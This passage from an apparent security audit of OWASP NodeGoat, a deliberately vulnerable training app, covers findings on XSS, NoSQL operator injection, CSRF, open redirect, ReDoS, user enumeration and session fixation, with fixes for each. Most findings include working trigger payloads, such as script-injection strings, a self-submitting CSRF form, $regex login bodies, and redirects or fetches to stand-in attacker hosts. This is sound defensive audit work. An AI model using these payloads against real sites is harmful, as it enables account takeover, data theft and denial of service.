- Severity corrected low-&gt;high: an anonymous visitor gains an admin account with no special conditions beyond deploying with the documented default seed.

</details>

</details>

<details>
<summary><b>YKB-009</b> · 🟠 High · Template autoescaping is switched off for the whole app, so stored profile and benefits data renders as raw HTML</summary>

**Location:** [`server.js:135-142`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/server.js#L135-L142) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- swig is configured with `autoescape:false` (`server.js:135-142`), so every `{{ }}` output is emitted as raw HTML in every template.
- The values rendered are user-controlled and persisted: profile `firstName`/`lastName` (stored by `profile-dao.js:42-92` from the `POST /profile` body), `benefitStartDate` (`benefits-dao.js:23-40` from the `POST /benefits` body), allocation and contribution fields, and login/signup echo-back values.

The dangerous sinks are the ones an ordinary user cannot only see themselves:

- `app/views/benefits.html:51-52` (`{{user.firstName}}` / `{{user.lastName}}`) and `:57` (`value="{{user.benefitStartDate}}"`) render every employee's stored values, so any authenticated user can park a script in their own record and have it run in the admin's browser when the admin opens `/benefits`.
- `app/views/layout.html:75` (`{{firstName}} {{lastName}}`) renders on every page of the app.
- `app/views/allocations.html:35-45` renders names of other users (see the allocations IDOR finding).

```js
    swig.setDefaults({
        // Autoescape disabled
        autoescape: false
        /*
        // Fix for A3 - XSS, enable auto escaping
        autoescape: true // default value
        */
    });
```

**Impact**

- **Attacker:** any logged-in user (for benefits, the victim is the admin).
- **Gain:** script execution in another user's session on the app origin - session riding, page/DOM defacement, exfiltration of whatever the app renders.

**How to trigger it**

- Sign up or log in, `POST /profile` with `firstName`=`<script>fetch('/memos').then(r=>r.text())</script>` (`bankRouting` must end with '#' to pass the check, e.g. 0198212#).
- Then log in as admin and open `/benefits`: the script runs.
- Simpler self-test: set `firstName` to `<img src=x onerror=alert(document.domain)>` and open `/dashboard`.

**How to fix it**

- As reported: set `autoescape: true` in `server.js:135-142`.
- If any template genuinely needs raw HTML (e.g. marked-rendered memos), use swig's |safe filter explicitly there rather than disabling escaping globally; also drop the manual ESAPI `encodeForHTML` at `app/routes/profile.js:29-33`, since with autoescape on it would double-encode.

Suggested code for `server.js`:

```js
swig.setDefaults({
    autoescape: true
});
```

<details>
<summary>How it was verified</summary>

- Verified `swig.setDefaults`(`{ autoescape: false }`) at `server.js:135-142`, so all `{{ }}` output is raw.
- User-controlled persisted values render unescaped: `benefits.html:51-52` and `:57` render every non-admin user's `firstName`/`lastName`/`benefitStartDate` to the admin (`benefits-dao.js` `getAllNonAdminUsers` returns raw documents; `profile-dao.js` `updateUser` stores `firstName` from the POST body unvalidated; signup persists names too via user-dao `addUser` with only length checks /^.{1,100}\$/).
- `layout.html:75` renders `{{firstName}}` `{{lastName}}` from the user document on dashboard, and `allocations.html:35` renders other users' names fetched via the `/allocations/:userId` IDOR (`userId` from URL params in `app/routes/allocations.js`).
- Concrete trigger: `POST /profile` with `firstName`=`<script>`... and a `bankRouting` matching /(\[0-9\]+)+\#/ (e.g. 0198212#), then any admin opening `/benefits` executes the script in their session.
- Cross-user stored XSS -&gt; high.

</details>

</details>

<details>
<summary><b>YKB-010</b> · 🟡 Medium · SSN, date of birth and bank account details are stored in the database unencrypted</summary>

**Location:** [`app/data/profile-dao.js:42-92`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/data/profile-dao.js#L42-L92) · **Category:** sensitive-data · **Status:** Confirmed

**What is wrong**

- Profile updates write the raw request values into the users document: ssn, dob, `bankAcc`, `bankRouting`, address (`profile-dao.js:42-92` -&gt; `$set: user`).
- The AES encryption helper is present only as a comment (`profile-dao.js:15-40` and `:67-76`), so all of it is stored in cleartext.

```js
    this.updateUser = (userId, firstName, lastName, ssn, dob, address, bankAcc, bankRouting, callback) => {

        // Create user document
        const user = {};
        if (firstName) {
            user.firstName = firstName;
        }
        if (lastName) {
            user.lastName = lastName;
        }
        if (address) {
            user.address = address;
        }
        if (bankAcc) {
            user.bankAcc = bankAcc;
        }
        if (bankRouting) {
            user.bankRouting = bankRouting;
        }
        if (ssn) {
            user.ssn = ssn;
        }
        if (dob) {
            user.dob = dob;
        }
        /*
        // Fix for A7 - Sensitive Data Exposure
        // Store encrypted ssn and DOB
        if(ssn) {
            user.ssn = encrypt(ssn);
        }
        if(dob) {
            user.dob = encrypt(dob);
        }
        */

        users.update({
                _id: parseInt(userId)
            }, {
                $set: user
            },
            err => {
                if (!err) {
                    console.log("Updated user profile");
                    return callback(null, user);
                }

                return callback(err, null);
            }
        );
    };
```

**Impact**

- **Attacker:** anyone with read access to MongoDB - a database backup/dump, an operator, another container on the unauthenticated compose network (`docker-compose.yml:13-17`), or anything that can reach the DB.
- **Gain:** employees' Social Security numbers, dates of birth and full bank account + routing numbers in plain text, i.e. direct identity-theft and payment-fraud material, plus the plaintext passwords stored alongside (`user-dao.js:25`).

**How to trigger it**

Log in, save a profile with `ssn=123-45-6789`, `bankAcc=000123456789`, `bankRouting=0198212`\#, then run `db.users.find({userName:'user1'})` - every field is readable as typed. The encryption code at `profile-dao.js:15-40` is never called.

**How to fix it**

Encrypt ssn/dob/`bankAcc`/`bankRouting` at rest with an authenticated mode (AES-256-GCM with a per-record random IV stored alongside the ciphertext, key from a secret store), and restrict the MongoDB deployment to authenticated, access-controlled clients; the commented helper in `profile-dao.js:15-40` uses an unauthenticated cipher and a per-process IV, so it needs rework, not just uncommenting.

Suggested code for `app/data/profile-dao.js`:

```js
// re-enable the helper at profile-dao.js:15-40, restore the key from the environment, and store
// hex(iv) with the ciphertext so decryption is possible, e.g.
// user.ssn = encrypt(ssn);  user.dob = encrypt(dob);  user.bankAcc = encrypt(bankAcc);
```

<details>
<summary>How it was verified</summary>

- Confirmed.
- `app/routes/profile.js:42-50` takes ssn, dob, `bankAcc`, `bankRouting` straight from `req.body` and `profile-dao.js:42-92` stores them verbatim in the users document via `$set`; the AES encrypt/decrypt helpers exist only inside block comments (`profile-dao.js:13-40` and 66-79) and are never called, so the values land in cleartext.
- Impact depends on database read access (backup/dump, operator, unauthenticated Mongo on the compose network), so medium is appropriate.

</details>

</details>

<details>
<summary><b>YKB-011</b> · 🟡 Medium · JSON body values are used directly as MongoDB query operators during login and signup</summary>

**Location:** [`app/data/user-dao.js:91-106`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/data/user-dao.js#L91-L106) · **Category:** injection · **Status:** Confirmed

**What is wrong**

- `bodyParser.json()` accepts a JSON body, so `userName` can be an object such as `{"$ne": null}` or `{"$regex": "^admin"}`; the DAO puts it straight into `findOne()`.
- An unauthenticated attacker can use operator injection to select arbitrary user documents (and, since `addUser` stores whatever it is given, to store operator objects), giving a username-existence oracle and, if any code later compares/uses the document fields, confused-deputy behaviour.

```js
        usersCol.findOne({
            userName: userName
        }, validateUserDoc);
    };

    // This is the good one, see the next function
    this.getUserById = (userId, callback) => {
        usersCol.findOne({
            _id: parseInt(userId)
        }, callback);
    };

    this.getUserByUserName = (userName, callback) => {
        usersCol.findOne({
            userName: userName
        }, callback);
```

**How to trigger it**

- `POST /login` with `Content-Type: application/json` and body `{"userName":{"$regex":"^admin"},"password":"x"}` returns "Invalid password" (a user matched) whereas `{"userName":{"$regex":"^zzz"}}` returns "Invalid username" - a blind enumeration oracle that ignores the exact-match check.
- Same for `GET /signup`?
- `POST /signup` with `userName` as an object passes /^.{1,20}\$/ because the object stringifies to "\[object Object\]" before `getUserByUserName` runs.

**How to fix it**

- Type-check before querying, e.g. in `validateLogin` and `getUserByUserName`: if (typeof `userName` `!==` 'string' || typeof password `!==` 'string') return callback(`noSuchUserError`, null); or validate the whole body with a schema.
- Do the same check in `handleSignup` (`app/routes/session.js:189-208`) before calling `getUserByUserName`/`addUser`.

Suggested code for `app/data/user-dao.js`:

```js
this.validateLogin = (userName, password, callback) => {
    if (typeof userName !== "string" || typeof password !== "string") {
        return callback({ noSuchUser: true }, null);
    }
    usersCol.findOne({ userName: userName }, validateUserDoc);
};
```

<details>
<summary>How it was verified</summary>

- Confirmed that the injection is real: `bodyParser.json()` is enabled globally (`server.js:71`), `handleLoginRequest` destructures `userName` from `req.body` (`session.js:43-45`), and `user-dao.js` passes it straight into `findOne`({`userName`: `userName`}) at `user-dao.js:91-94` (and `getUserByUserName` at `user-dao.js:103-107`), so `{"$ne": null}` or `{"$regex": "^admin"}` matches documents; signup's /^.{1,20}\$/ also accepts an object (stringifies to "\[object Object)") and stores it.
- However there is no authentication bypass: `comparePassword` does `fromDB` `===` `fromUser` against the single matched document's stored password string (`user-dao.js:59-66`), and password/verify comparison at signup forces a string, so an attacker can never authenticate as another user.
- The real gain is a blind username-enumeration oracle - the app renders distinct errors for `noSuchUser` vs `invalidPassword` (`session.js:73-92`).
- That is low, not medium.

</details>

</details>

<details>
<summary><b>YKB-012</b> · 🟡 Medium · No CSRF tokens on any state-changing form</summary>

**Location:** [`app/routes/index.js:44-56`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/index.js#L44-L56) · **Category:** csrf · **Status:** Confirmed

**What is wrong**

- csurf is imported but never mounted (`// const csrf = require('csurf')` at `server.js:7`, `app.use(csrf())` commented at `:104-113`) and no handler checks a token, although the forms still carry a dead `_csrf` field.
- Every state-changing route is therefore forgeable cross-site: `POST /profile` (change SSN/bank account), `POST /contributions`, `POST /memos` (stored XSS injection), `POST /benefits` (admin data), `POST /logout`.
- The session cookie also has no `SameSite` attribute, so it is sent on cross-site POSTs.

```js
    app.get("/dashboard", isLoggedIn, sessionHandler.displayWelcomePage);

    // Profile page
    app.get("/profile", isLoggedIn, profileHandler.displayProfile);
    app.post("/profile", isLoggedIn, profileHandler.handleProfileUpdate);

    // Contributions Page
    app.get("/contributions", isLoggedIn, contributionsHandler.displayContributions);
    app.post("/contributions", isLoggedIn, contributionsHandler.handleContributionsUpdate);

    // Benefits Page
    app.get("/benefits", isLoggedIn, benefitsHandler.displayBenefits);
    app.post("/benefits", isLoggedIn, benefitsHandler.updateBenefits);
```

**How to trigger it**

- Host a page with `<form action="http://victim:4000/profile" method="POST"><input name="firstName" value="pwned"><input name="bankAcc" value="999"><input name="bankRouting" value="0198212#"></form><script>document.forms[0].submit()</script>`; a logged-in victim visiting it has their profile overwritten.
- Same for `/memos` with an XSS payload.

**How to fix it**

Mount csurf before the route table (after session, `server.js:102`) rather than after routes; set `sameSite: "lax"` (or "strict") in the session cookie options at `server.js:78-102`; and render the real token. csurf also needs the token in the body for form POSTs, so add the hidden field back to every form: `contributions.html:92` (un-comment), `benefits.html:54`, `memos.html`, logout link -&gt; use `POST /logout`.

Suggested code for `app/routes/index.js`:

```js
app.use(csrf());
app.use((req, res, next) => {
    res.locals.csrftoken = req.csrfToken();
    next();
});

// session options
app.use(session({
    secret: cookieSecret,
    saveUninitialized: false,
    resave: false,
    cookie: { httpOnly: true, sameSite: "lax" }
}));
```

<details>
<summary>How it was verified</summary>

- Searched the whole app: csurf is only a commented require (`server.js:7`) and the `app.use(csrf())` mount is commented out (`server.js:107-112`); no route or handler checks any token.
- The \_csrf hidden fields are dead (`app/views/profile.html:73`, `login.html:117`, `signup.html:104`, `contributions.html:91` is inside an HTML comment) and csrftoken is never populated, since `res.locals.csrftoken` is only set in the commented block.
- Session cookie options, including `sameSite`, are commented out (`server.js:92-100`), so express-session uses its default cookie with no `SameSite` attribute.
- All the cited state-changing routes exist with only `isLoggedIn` (`index.js:48`, 52, 56, 67), so a cross-site form POST from a logged-in victim is accepted.
- Real, but needs the victim to visit an attacker page =&gt; medium is right.

</details>

</details>

<details>
<summary><b>YKB-013</b> · 🟡 Medium · Learning Resources link redirects to any URL supplied in the query string</summary>

**Location:** [`app/routes/index.js:70-74`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/index.js#L70-L74) · **Category:** open-redirect · **Status:** Confirmed

**What is wrong**

`GET /learn` takes the redirect target straight from the query string: `res.redirect(req.query.url)` (`index.js:70-73`). Express puts the value verbatim in the Location header, so any absolute URL is honoured.

```js
    app.get("/learn", isLoggedIn, (req, res) => {
        // Insecure way to handle redirects by taking redirect url from query string
        return res.redirect(req.query.url);
    });
```

**Impact**

- **Attacker:** anyone who can get a logged-in user to click a link (the route requires a session, `index.js:70`).
- **Gain:** a trustworthy-looking link on the app's own domain that bounces the victim to an attacker-controlled site, e.g. a phishing page replica of RetireEasy's login, or `javascript:`/`//evil.example` variants - the classic open redirect used to launder links and to steal credentials entered on the fake page.

**How to trigger it**

Log in, then request `GET /learn?url=https://evil.example/login` - the response is a 302 with Location: https://evil.example/login. `GET /learn?url=//evil.example` also redirects off-site.

**How to fix it**

Accept only a known set of destinations, or only a same-origin absolute path, and provide a default:

```js
const LEARN_LINKS = new Set(["https://www.investopedia.com/retirement/401k-plans/" /* ... */]);
const target = LEARN_LINKS.has(req.query.url) ? req.query.url : "/dashboard";
return res.redirect(target);

// or: const target = String(req.query.url || "/dashboard");
//     if (!/^\/(?!\/)/.test(target)) target = "/dashboard";
```

Suggested code for `app/routes/index.js`:

```js
app.get("/learn", isLoggedIn, (req, res) => {
    const target = req.query.url || "";
    const allowed = /^https:\/\/([a-z0-9-]+\.)*khanacademy\.org\//i;
    return res.redirect(allowed.test(target) ? target : "/dashboard");
});
```

<details>
<summary>How it was verified</summary>

- `app/routes/index.js:70-73` does `return res.redirect(req.query.url)` with no allow-list or scheme check.
- Express sets Location to the given value verbatim, so both https://evil.example and protocol-relative //evil.example leave the site.
- Route is guarded by `isLoggedIn` (`req.session.userId` only, `session.js:36-42`), so the attacker needs the victim logged in and clicking a crafted link; the classic medium open-redirect.
- Also note the missing-param case (`/learn` with no url) throws in `res.redirect` and lands on the 500 page; the fix should default.

</details>

</details>

<details>
<summary><b>YKB-014</b> · 🟡 Medium · Bank routing validation regex backtracks catastrophically and can hang the single-threaded server</summary>

**Location:** [`app/routes/profile.js:58-63`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/profile.js#L58-L63) · **Category:** dos · **Status:** Confirmed

**What is wrong**

- The bank routing number check uses /(\[0-9\]+)+\#/ (`profile.js:59`) against the raw request body value (`profile.js:61`).
- The nested quantifier `([0-9]+)+` backtracks exponentially on a long digit run that is not followed by `#`, and the string is user controlled with no length limit.

```js
        // const regexPattern = /([0-9]+)\#/;
        const regexPattern = /([0-9]+)+\#/;
        // Allow only numbers with a suffix of the letter #, for example: 'XXXXXX#'
        const testComplyWithRequirements = regexPattern.test(bankRouting);
        // if the regex test fails we do not allow saving
        if (testComplyWithRequirements !== true) {
```

**Impact**

- **Attacker:** any logged-in user.
- **Gain:** a single small POST pins one CPU core in the Node event loop, which is single-threaded, so the whole application (all users) stops responding until the regex finishes - a one-request denial of service.

**How to trigger it**

- Log in, then `POST /profile` with `bankRouting` set to "1111111111111111111111111111111111!"
- (30+ digits then a non-matching char) and `firstName=1`.
- The request takes seconds to minutes; repeat a few times to wedge the process.

**How to fix it**

Use the anchored, non-nested pattern and bound the length before testing; also keep the 500-page free of the raw error:

```js
if (typeof bankRouting !== "string" || bankRouting.length > 20) {
    return res.render("profile", { updateError: "Bank Routing number must be 1-20 characters", ... });
}
const regexPattern = /^[0-9]+#$/;
if (!regexPattern.test(bankRouting)) { /* re-render with error */ }
```

Suggested code for `app/routes/profile.js`:

```js
const regexPattern = /^[0-9]+#$/;
if (typeof bankRouting !== "string" || bankRouting.length > 20 || !regexPattern.test(bankRouting)) {
    // re-render with the format error
}
```

<details>
<summary>How it was verified</summary>

- `app/routes/profile.js:59` uses /(\[0-9\]+)+#/ and `:61` tests it against `req.body.bankRouting`, which `bodyParser.urlencoded` gives as an attacker-controlled string up to the 100kb body limit (`server.js:72-75`) with no length cap anywhere in the handler.
- The nested quantifier over a single class is the textbook (a+)+ catastrophic-backtracking shape, so a long digit run with no trailing '#' makes the engine try ~2^n partitionings before failing.
- Reachable by any logged-in user (route `index.js:48`, `isLoggedIn`) with a POST to `/profile`; Node is single-threaded so one request blocks the whole app.
- Confirmed, medium (single-request DoS).

</details>

</details>

<details>
<summary><b>YKB-015</b> · 🟡 Medium · Remote page body is echoed back as <code>text/html</code>, giving script execution from any forged response</summary>

**Location:** [`app/routes/research.js:18-27`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/research.js#L18-L27) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- When the outbound fetch succeeds the handler sets `Content-Type: text/html` and writes the remote body straight into its own response with `res.write(body)`, in the application's origin.
- An attacker controls the fetched page (via the `url` parameter, which is unvalidated), so they can return `<script>...</script>` and it executes in the victim's RetireEasy session, reading data from `/profile` and `/benefits` or acting with the victim's cookie.

```js
                    res.writeHead(200, {
                        "Content-Type": "text/html"
                    });
                }
                res.write("<h1>The following is the stock information you requested.</h1>\n\n");
                res.write("\n\n");
                if (body) {
                    res.write(body);
                }
                return res.end();
```

**How to trigger it**

Log in, host a page containing `<script>alert(document.domain)</script>` on any server, then visit `/research?url=http://attacker.example/&symbol=x` - the script runs in the app origin (response `Content-Type` is forced to `text/html` and the body is not escaped).

**How to fix it**

Do not render remote HTML in the app origin. Serve it as `text/plain` and drop the HTML wrapper, or escape it, e.g. render a template with `{{body}}` and enable swig autoescaping in `server.js:135-142`.

Suggested code for `app/routes/research.js`:

```js
res.set("Content-Type", "text/plain; charset=utf-8");
res.write("<h1>...</h1>");
res.end(String(body));
```

<details>
<summary>How it was verified</summary>

- Reachable and controlled: `/research` is logged-in-only (`app/routes/index.js:76`) but the target is entirely client-chosen (`research.js:15`), so the attacker serves the fetched page.
- The callback sets `Content-Type: text/html` (`research.js:18-20`) and does `res.write(body)` with no escaping (`research.js:24-26`); autoescape is globally off (`server.js:135-137`), and the callback path really is the one that responds because `research.js:16` returns from the handler before the `res.render` at line 31.
- **Impact:** script runs on the app origin in the victim's session, who must be logged in and click the crafted link - reflected XSS, medium is right.

</details>

</details>

<details>
<summary><b>YKB-016</b> · 🟡 Medium · Login errors reveal whether a user name exists and there is no attempt throttling</summary>

**Location:** [`app/routes/session.js:53-118`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/session.js#L53-L118) · **Category:** authentication · **Status:** Confirmed

**What is wrong**

- Login distinguishes an unknown user name from a wrong password: `err.noSuchUser` renders "Invalid username" (`session.js:63-89`) and `err.invalidPassword` renders "Invalid password" (`session.js:90-98`), while the neutral "Invalid username and/or password" string is only the commented-out alternative (`session.js:59-61`, 86-87).
- There is also no rate limiting, delay or lockout anywhere in the login path (`session.js:53-119`, `user-dao.js:57-94`).

```js
    this.handleLoginRequest = (req, res, next) => {
        const {
            userName,
            password
        } = req.body;
        userDAO.validateLogin(userName, password, (err, user) => {
            const errorMessage = "Invalid username and/or password";
            const invalidUserNameErrorMessage = "Invalid username";
            const invalidPasswordErrorMessage = "Invalid password";
            if (err) {
                if (err.noSuchUser) {
                    console.log("Error: attempt to login with invalid user: ", userName);

                    // Fix for A1 - 3 Log Injection - encode/sanitize input for CRLF Injection
                    // that could result in log forging:
                    // - Step 1: Require a module that supports encoding
                    // const ESAPI = require('node-esapi');
                    // - Step 2: Encode the user input that will be logged in the correct context
                    // following are a few examples:
                    // console.log('Error: attempt to login with invalid user: %s',
                    //     ESAPI.encoder().encodeForHTML(userName));
                    // console.log('Error: attempt to login with invalid user: %s',
                    //     ESAPI.encoder().encodeForJavaScript(userName));
                    // console.log('Error: attempt to login with invalid user: %s',
                    //     ESAPI.encoder().encodeForURL(userName));
                    // or if you know that this is a CRLF vulnerability you can target this specifically as follows:
                    // console.log('Error: attempt to login with invalid user: %s',
                    //     userName.replace(/(\r\n|\r|\n)/g, '_'));

                    return res.render("login", {
                        userName: userName,
                        password: "",
                        loginError: invalidUserNameErrorMessage,
                        //Fix for A2-2 Broken Auth - Uses identical error for both username, password error
                        // loginError: errorMessage
                        environmentalScripts
                    });
                } else if (err.invalidPassword) {
                    return res.render("login", {
                        userName: userName,
                        password: "",
                        loginError: invalidPasswordErrorMessage,
                        //Fix for A2-2 Broken Auth - Uses identical error for both username, password error
                        // loginError: errorMessage
                        environmentalScripts
                    });
                } else {
                    return next(err);
                }
            }

            // A2-Broken Authentication and Session Management
            // Upon login, a security best practice with regards to cookies session management
            // would be to regenerate the session id so that if an id was already created for
            // a user on an insecure medium (i.e: non-HTTPS website or otherwise), or if an
            // attacker was able to get their hands on the cookie id before the user logged-in,
            // then the old session id will render useless as the logged-in user with new privileges
            // holds a new session id now.

            // Fix the problem by regenerating a session in each login
            // by wrapping the below code as a function callback for the method req.session.regenerate()
            // i.e:
            // `req.session.regenerate(() => {})`
            req.session.userId = user._id;
            return res.redirect(user.isAdmin ? "/benefits" : "/dashboard");
        });
```

**Impact**

- **Attacker:** an anonymous visitor.
- **Gain:** reliable enumeration of valid accounts, which feeds password guessing; with no throttle, unlimited guesses run against the plain-text comparison at `user-dao.js:60-66` at full speed.

**How to trigger it**

`POST /login` with `userName=admin&password=wrong` -&gt; "Invalid password"; `POST /login` with `userName=nosuchuser&password=wrong` -&gt; "Invalid username". Then loop thousands of password guesses for a confirmed name with no 429/lockout.

**How to fix it**

- Return `errorMessage` in both failure branches (`session.js:85` and 94) and add per-IP and per-account attempt limiting with a delay/lockout.
- Also store passwords hashed with bcrypt (`app/data/user-dao.js:25-30`) so a successful brute force is not the only cost.

Suggested code for `app/routes/session.js`:

```js
loginError: errorMessage // in both the noSuchUser and invalidPassword branches
```

<details>
<summary>How it was verified</summary>

- Reachable anonymously at `POST /login` (`app/routes/index.js:34`).
- Controlled: `req.body.userName`/password.
- **Impact:** the two failure branches render different strings - "Invalid username" (`app/routes/session.js:85`) vs "Invalid password" (`session.js:94`) - while the generic `errorMessage` is only the commented alternative (`session.js:59-61`, 86-87).
- I grepped app/routes, app/data, `server.js` and config for rate/limit/throttle/lockout and found nothing, and the comparison is a plain `===` (`app/data/user-dao.js:60-67`), so unlimited fast guessing follows enumeration.
- Confirmed as described.

</details>

</details>

<details>
<summary><b>YKB-017</b> · 🟡 Medium · Session id is not regenerated at login, so an attacker-planted session id becomes an authenticated session</summary>

**Location:** [`app/routes/session.js:104-118`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/session.js#L104-L118) · **Category:** session · **Status:** Confirmed

**What is wrong**

- `handleLoginRequest` writes the authenticated user id straight into the existing session object (`session.js:116`) without calling `req.session.regenerate()`; the session id issued to the anonymous visitor is kept.
- Signup does regenerate (`session.js:234`), which shows the intent.

```js
            // A2-Broken Authentication and Session Management
            // Upon login, a security best practice with regards to cookies session management
            // would be to regenerate the session id so that if an id was already created for
            // a user on an insecure medium (i.e: non-HTTPS website or otherwise), or if an
            // attacker was able to get their hands on the cookie id before the user logged-in,
            // then the old session id will render useless as the logged-in user with new privileges
            // holds a new session id now.

            // Fix the problem by regenerating a session in each login
            // by wrapping the below code as a function callback for the method req.session.regenerate()
            // i.e:
            // `req.session.regenerate(() => {})`
            req.session.userId = user._id;
            return res.redirect(user.isAdmin ? "/benefits" : "/dashboard");
        });
```

**Impact**

- **Attacker:** someone who can plant a known session id on the victim (a sibling subdomain/host on the same site, a shared machine, or a pre-auth link) and later use it.
- **Gain:** they hold a session id that is upgraded to the victim's authenticated session after login, so they can use the victim's account without knowing the password.

**How to trigger it**

- Set the victim's `connect.sid` cookie to a session id you already hold (one issued by your own visit to /), get the victim to log in, then replay the same cookie: you are logged in as the victim.
- The `Set-Cookie` value does not change between the pre-login `GET /login` and the post-login response.

**How to fix it**

Regenerate the session on login as the comment suggests, as signup already does.

Suggested code for `app/routes/session.js`:

```js
req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.userId = user._id;
    return res.redirect(user.isAdmin ? "/benefits" : "/dashboard");
});
```

<details>
<summary>How it was verified</summary>

- `app/routes/session.js:116` assigns `req.session.userId = user._id` on the pre-existing session object with no `req.session.regenerate()`; signup does regenerate (`session.js:234`), and the fix is left commented at `session.js:104-115`.
- Sessions are express-session with default `connect.sid` name and `saveUninitialized: true` (`server.js:78-96`), and the server is plain HTTP (`server.js:145-148`), so an attacker can obtain a session id (`GET /login`) and plant it on the victim, then replay it after the victim logs in.
- Not session-id rotation = real session fixation; medium fits.

</details>

</details>

<details>
<summary><b>YKB-018</b> · 🟡 Medium · Allocations path segment is reflected unescaped into a form action attribute</summary>

**Location:** [`app/views/allocations.html:15`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/views/allocations.html#L15) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- `displayAllocations` passes the raw path segment to the template as `userId` (`allocations.js:16-27`), and `app/views/allocations.html:15` writes it into an attribute: `<form action="/allocations/{{userId}}" ...>`.
- With autoescaping off (`server.js:135-142`) the value is emitted verbatim, so a path segment containing `"><script>...` breaks out of the attribute.

- The lookup uses parseInt(userId) (`allocations-dao.js:58`), so a value with a numeric prefix still resolves to a real document and the page renders, which is what makes the reflection reachable.
- Feasible via a link the attacker sends (route requires login, `index.js:63`).

```html
                <form action="/allocations/{{userId}}" method="get" role="search">
```

**Impact**

- **Attacker:** any site or messaging channel that can get a logged-in user to click `/allocations/1`"&gt;`<script>`...`</script>`.
- **Gain:** script execution in the victim's session on the app origin.

**How to trigger it**

- As a logged-in user, visit `/allocations/1`"&gt;`<script>``alert(document.domain)``</script>` (URL-encoded) - `parseInt` gives 1, user 1's allocations are found, the page renders, and the script in the form action executes.
- Note user 2's record is readable too (see the IDOR finding).

**How to fix it**

Turn on swig autoescaping globally (`server.js:135-142`) and, defensively, render a numeric id: `userId: parseInt(userId, 10)` in `app/routes/allocations.js`. Enabling autoescape affects every template, so review them together.

Suggested code for `app/views/allocations.html`:

```html
// app/routes/allocations.js
res.render("allocations", { userId: parseInt(userId, 10), allocations, environmentalScripts });
// server.js
swig.setDefaults({ autoescape: true });
```

<details>
<summary>How it was verified</summary>

- Route `/allocations/:userId` (`app/routes/index.js:63`) requires login only, and Express decodes the segment, so `req.params.userId` can be `1"><script>alert(document.domain)</script>`.
- `displayAllocations` forwards it raw to the template (`app/routes/allocations.js:16-27`); `allocations-dao.js:92` uses `parseInt` for the query so the lookup succeeds for user 1 (who has a seeded allocation, `artifacts/db-reset.js:113-121`), and `app/views/allocations.html:15` emits `{{userId}}` inside the action attribute while autoescape is globally false (`server.js:135-137`).
- Reflected XSS in the app origin on a crafted link - medium is right.

</details>

</details>

<details>
<summary><b>YKB-019</b> · 🟡 Medium · Login page echoes the posted user name unescaped into an HTML attribute</summary>

**Location:** [`app/views/login.html:110`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/views/login.html#L110) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- `handleLoginRequest` renders the login page with the submitted `userName` on both failure branches (`session.js:82-89` and 91-98, `userName: userName`), and `app/views/login.html:110` emits it inside an attribute: `value="{{userName}}"`.
- With autoescaping disabled (`server.js:135-142`) a `userName` containing `"` closes the attribute and lets markup through.

```html
                                    <input type="text" class="form-control" id="userName" name="userName" value="{{userName}}" placeholder="Enter User Name">
```

**Impact**

- **Attacker:** needs the victim to POST a crafted login form (a self-submitting cross-site form on the login page), so impact is limited, but it is real reflection of request data into raw HTML and is a second sink of the same missing output encoding.

**How to trigger it**

`POST /login` with `userName`=`"><script>alert(document.domain)</script>`&amp;`password=x` - the response login page contains `<input ... value=""><script>alert(document.domain)</script>" ...>` and the script runs.

**How to fix it**

- Enabling autoescape at `server.js:135-142` fixes this sink, but it must be done together with the memos/layout sinks: swig will then escape `{{ marked(doc.memo) }}` (`app/views/memos.html:31`) and `{{script}}` (`app/views/layout.html:126`), so those two need `| safe` where the value is already trusted/sanitized.
- Prefer not echoing the submitted user name at all: set `userName: ""` in both error renders (`app/routes/session.js:82-98`), as `displayLoginPage` already does.

Suggested code for `app/views/login.html`:

```html
// app/routes/session.js, both error branches
return res.render("login", {
    userName: "",
    password: "",
    loginError: invalidUserNameErrorMessage,
    environmentalScripts
});
```

<details>
<summary>How it was verified</summary>

- Reachable and attacker-controlled.
- `app/routes/index.js:34` maps `POST /login`, and both failure branches of `handleLoginRequest` render `userName` straight from `req.body` (`app/routes/session.js:82-89` `noSuchUser`, `:91-98` `invalidPassword`; the `noSuchUser` error is produced at `app/data/user-dao.js:83-88` for a nonexistent user).
- `login.html:110` emits it inside value="`{{userName}}`" and swig autoescape is off (`server.js:135-142`, '`autoescape: false`'), so the value is inserted as raw markup.
- No validation or escaping is applied to `userName` anywhere.
- Trigger: `POST /login` with `userName`="&gt;`<script>``alert(document.domain)``</script>`&amp;`password=x` -&gt; the rendered login page contains `<input ... value=""><script>alert(document.domain)</script>" ...>` and it executes.
- Severity raised low-&gt;medium because reflected XSS is medium on this scale (victim must submit the crafted POST).

</details>

</details>

<details>
<summary><b>YKB-020</b> · 🟡 Medium · Signup page echoes posted user name and email unescaped</summary>

**Location:** [`app/views/signup.html:75-102`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/views/signup.html#L75-L102) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- Both failure paths of `handleSignup` render the signup page with attacker-influenced values: the `errors` object carries the raw `userName` and `email` (`session.js:201-204`) and `app/views/signup.html:75` / `:102` emit them inside `value="..."` attributes; the error text at `signup.html:57` is also raw.
- Autoescaping is off (`server.js:135-142`).

```html
                                    <input type="text" class="form-control" id="userName" value="{{userName}}" name="userName" placeholder="Enter user name">
                                </div>

                                <div class="form-group">
